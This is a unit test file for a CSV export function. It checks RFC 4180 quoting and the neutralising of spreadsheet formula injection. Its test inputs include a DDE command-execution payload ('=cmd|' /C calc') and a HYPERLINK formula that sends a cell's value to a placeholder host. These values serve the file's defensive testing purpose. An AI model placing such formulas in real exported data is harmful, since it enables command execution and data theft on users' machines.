/// <reference types="bun-types" />
import { describe, expect, test } from "bun:test";

import { toCsv } from "./csv.ts";

const cell = (value: string) => toCsv(["h"], [[value]]).split("\r\n")[1];

describe("toCsv", () => {
	test("writes plain cells as they are", () => {
		expect(toCsv(["Person", "Hours"], [["Ana", "7.50"]])).toBe(
			"Person,Hours\r\nAna,7.50",
		);
	});

	test("quotes a comma, a quote or a line break (RFC 4180)", () => {
		expect(cell("a,b")).toBe('"a,b"');
		expect(cell('say "hi"')).toBe('"say ""hi"""');
		expect(cell("one\ntwo")).toBe('"one\ntwo"');
	});

	test("prefixes a cell a spreadsheet would read as a formula", () => {
		expect(cell("=1+1")).toBe("'=1+1");
		expect(cell("+1+1")).toBe("'+1+1");
		expect(cell("-1+1")).toBe("'-1+1");
		expect(cell("@SUM(A1)")).toBe("'@SUM(A1)");
		expect(cell("\t=1+1")).toBe("'\t=1+1");
		expect(cell("\r=1+1")).toBe('"\'\r=1+1"');
		expect(cell("=cmd|' /C calc'!A0")).toBe("'=cmd|' /C calc'!A0");
	});

	test("prefixes before quoting, so the quote wraps the whole cell", () => {
		expect(cell('=HYPERLINK("https://x.example/?d="&A2,"Details")')).toBe(
			'"\'=HYPERLINK(""https://x.example/?d=""&A2,""Details"")"',
		);
	});

	test("leaves a plain number alone, a negative one too", () => {
		expect(cell("-1.50")).toBe("-1.50");
		expect(cell("-3")).toBe("-3");
		expect(cell("0.00")).toBe("0.00");
		expect(cell("2026-08-12")).toBe("2026-08-12");
	});
});
